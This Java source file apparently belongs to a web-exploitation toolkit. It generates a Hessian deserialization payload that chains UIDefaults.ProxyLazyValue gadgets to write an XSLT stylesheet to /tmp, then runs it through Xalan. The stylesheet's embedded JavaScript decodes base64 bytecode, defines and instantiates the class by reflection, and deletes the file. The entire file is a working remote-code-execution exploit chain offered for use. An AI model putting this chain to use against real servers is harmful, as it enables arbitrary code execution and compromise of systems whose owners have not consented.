package com.reajason.javaweb.packer.deserialize.hessian;

import com.reajason.javaweb.packer.deserialize.utils.HessianUtils;
import com.reajason.javaweb.packer.deserialize.utils.Reflections;
import lombok.SneakyThrows;

import javax.swing.*;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;

/**
 * @author ReaJason
 * @since 2025/2/19
 */
public class XSLTScriptEngine {
    @SneakyThrows
    public static Object generate(byte[] bytes, String className) {
        String base64Str = Base64.getEncoder().encodeToString(bytes);

        String tmpPath = "/tmp/CACHE_XML";

        String xml = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n" +
                "                xmlns:se=\"http://xml.apache.org/xalan/java/javax.script.ScriptEngineManager\"\n" +
                "                xmlns:js=\"http://xml.apache.org/xalan/java/javax.script.ScriptEngine\">\n" +
                "    <xsl:template match=\"/\">\n" +
                "        <xsl:variable name=\"js\" select=\"&quot;var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName('java.net.URL'), 0),java.lang.Thread.currentThread().getContextClassLoader());var className = '" + className + "';var base64Str = '" + base64Str + "';try { classLoader.loadClass(className).newInstance();} catch (e) { var clsString = classLoader.loadClass('java.lang.String'); var bytecode; try { var clsBase64 = classLoader.loadClass('java.util.Base64'); var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder'); var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz); bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, base64Str); } catch (ee) { try { var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter'); bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, base64Str); } catch (eee) { var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder'); bytecode = clazz1.newInstance().decodeBuffer(base64Str); } } var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader'); var clsByteArray = (new java.lang.String('a').getBytes().getClass()); var clsInt = java.lang.Integer.TYPE; var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]); defineClass.setAccessible(true); var clazz = defineClass.invoke(classLoader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length)); clazz.newInstance();}new java.io.File('" + tmpPath + "').delete()&quot;\" />\n" +
                "        <xsl:variable name=\"result\" select=\"js:eval(se:getEngineByName(se:new(),'js'), $js)\"/>\n" +
                "        <xsl:value-of select=\"$result\"/>\n" +
                "    </xsl:template>\n" +
                "</xsl:stylesheet>\n";

        UIDefaults.ProxyLazyValue writeValue = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{tmpPath, xml.getBytes()});
        Reflections.setFieldValue(writeValue, "acc", null);
        UIDefaults.ProxyLazyValue processValue = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "file://" + tmpPath}});
        Reflections.setFieldValue(processValue, "acc", null);

        HashMap<Object, Object> map1 = new HashMap<>(1);
        HashMap<Object, Object> map2 = new HashMap<>(1);
        HashMap<Object, Object> map3 = new HashMap<>(1);
        HashMap<Object, Object> map4 = new HashMap<>(1);
        map1.put("a", new UIDefaults(new Object[]{"abc", writeValue}));
        map2.put("a", new UIDefaults(new Object[]{"abc", writeValue}));
        map3.put("b", new UIDefaults(new Object[]{"ccc", processValue}));
        map4.put("b", new UIDefaults(new Object[]{"ccc", processValue}));

        return HessianUtils.toMap(Arrays.asList(map1, map2, map3, map4));
    }
}
